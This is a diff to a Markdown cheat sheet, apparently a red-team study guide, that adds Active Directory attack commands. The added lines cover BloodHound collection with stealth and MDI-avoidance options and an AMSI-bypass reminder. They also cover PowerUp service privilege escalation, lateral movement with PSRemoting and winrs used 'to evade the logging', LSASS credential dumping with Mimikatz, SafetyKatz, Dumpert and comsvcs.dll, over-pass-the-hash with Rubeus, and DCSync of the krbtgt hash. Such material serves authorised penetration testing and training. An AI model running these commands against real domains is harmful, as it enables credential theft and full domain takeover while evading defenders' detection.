@@ -328,6 +328,8 @@ Get-NetFileServer
 ```
 
 ## BloodHound
+Provides a GUI for AD entities and relationships for the data collected by its ingestors. It uses Graph Theory for providing the capability of mapping shortest path for interesting things lik Domain Admins. Furthermore, it provides built-in queries for frequently used actions.
+
 ### Install neo4j
 Open cmd as Administrator and open the following directory
 ```
@@ -345,12 +347,55 @@ neo4j.bat start
 ```
 
 Browse to http://localhost:7474 and login using the following credentials
-user: neo4j
-password: bloodhound
+
+- user: neo4j
+- password: bloodhound
+
+**NOTE**: In order to perform the following command remember to bypass .NET AMSI
+
+In order to supply data to BloodHound perform the following commands
+```
+Invoke-BloodHound -CollectionMethod All
+```
+
+Or perform the follwing command
+```
+SharpHound.exe
+```
+
+To make BloodHound collection stealthy use *-Sthealt* option
+```
+Invoke-BloodHound -Stealth
+```
+
+or with SharpHound
+```
+SharpHound.exe --stealth
+```
+
+To avoid detections like MDI
+```
+Invoke-BloodHound -ExcludeDCs
+```
+
+The gathered data can be uploaded to the BloodHound application.
 
 ## Privilege Escalation
 ### Useful tools 
 - [PowerUP](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+- [Privesc](https://github.com/enjoiz/Privesc)
+- [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+
+### Local privilege escalation methods
+
+There are various ways of locally escalating privileges in Windows box:
+- Missing patches
+- Automated deployment and AutoLogon passwords in clear text
+- AlwaysInstallElevated (any user can run MSI as SYSTEM)
+- Misconfigured Services
+- DLL Hijacking and more
+- [NTLM Relaying a.k.a Won't Fix](https://github.com/antonioCoco/RemotePotato0)
+
 ### Local Admin Privilege Escalation using PowerUp
 Load the PowerUp.ps1 module
 ```
@@ -359,7 +404,12 @@ Load the PowerUp.ps1 module
 
 Enumerate exploitable unquoted service
 ```
-Get-ServiceUquoted
+Get-ServiceUquoted -Verbose
+```
+
+Get services where current user can write to its binary path or change arguments to the binary
+```
+Get-ModifiableServiceFile -Verbose
 ```
 
 Enumerate services vulnerable to config modify
@@ -404,6 +454,132 @@ nc64.exe -lvp 443
 
 ## Lateral Movement
 Below a list of techniques that may be useful to escalate to domain admin performing a credential dump or exploiting an available Domain Admin session. 
+
+### Lateral movement using PowerShell Remoting
+This tool is the best solution for passing the hashes, using credentials and executing commands on multiple remote computers
+It allows to perform One-to-One lateral movements, it opens an interactive PowerShell session.
+Useful commands:
+```
+New-PSSession
+```
+```
+Enter-PSSession
+```
+
+It allows commands in One-to-Many mode, but is non interactive, however allows to perform commands parallely on several servers.
+
+Useful commands:
+```
+Invoke-Command
+```
+
+Perform commands or scriptblocks on several servers:
+```
+Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
+```
+
+Run scripts from files on multiple servers:
+```
+Invoke-Command -FilePath <ps1 script path> -ComputerName (Get-Content <list_of_servers>)
+```
+
+Execute locally loaded functions on the remote machines:
+```
+Invoke-Command -ScriptBlock ${function:<loaded_function>} -ComputerName (Get-Content <list_of_servers) -ArgumentList
+```
+
+Execute stateful commands using Invoke-Command:
+```
+$sess = New-PSSession -ComputerName <Servername>
+Invoke-Command -Session $sess -ScriptBlock {$proc = <ps1 function>}
+Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
+```
+
+### Lateral movement using Winrs
+Winrs can be used in place of PSRemoting to evade the logging:
+```
+winrs -r:<server_name> -u:<domain\user> -p:<password> cmd
+```
+
+### Lateral movement using Mimikatz
+Mimikatz can be used to run credentials, tickets and many more interesting attacks. 
+
+Invoke-Mimikatz is a PowerShell port of Mimikatz. Using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory. All the functions of mimikatz can be used from this script.
+**The script needs adminstrative privileges for dumping credentials from local machine** 
+
+#### Extract credentials from LSASS
+Dump credentials on a local machine using Mimikatz
+```
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+```
+
+Dump credentials using SafetyKatz.exe
+```
+SafetyKatz.exe "sekurlsa::ekeys"
+```
+
+Dump credentials using SharpKatz
+```
+SharpKatz.exe --Command ekeys
+```
+
+Dump credentials using Dumpert
+```
+rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
+```
+
+Dump credentials using pypykatz
+```
+pypykatz.exe live lsa
+```
+
+Dump credentials using comsvcs.dll
+```
+tasklist /FI "IMAGENAME eq lsass.exe"
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
+```
+
+#### Over Pass The Hash
+Over Pass the Hash (OPTH) generate tokens from hashes or keys. 
+
+**NOTE**: It need to be run as Administrator
+
+Using Invoke-Mimikatz:
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:<domain_name> /aes256:<aes256key> /run:powershell.exe"'
+```
+
+Using SafetyKatz:
+```
+SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:<domain_name> /aes256:<aes256keys> /run:cmd.exe" "exit"
+```
+
+Using Rubeus
+
+The command below do not need elevation
+```
+Rubeus.exe asktgt /user:administrator /rc4:ntlmhash /ptt
+```
+
+The following command needs elevation
+```
+Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+#### DCSync
+To exetract credentials from the DC without code execution on it, we can use DCSync. 
+
+In order to use DCSync feature for getting krbtgt hash execute the below command **with Domain Admin privileges**
+```
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
+```
+
+Using SafetyKatz
+```
+SafetyKatz.exe "lsadump::dcsync /user:<domain>\krbtgt" "exit"
+```
+
+
 
 ### Derivative Local Admin to dump credentials
 Using winrs to connect on remote machine on which the user has local admin privileges
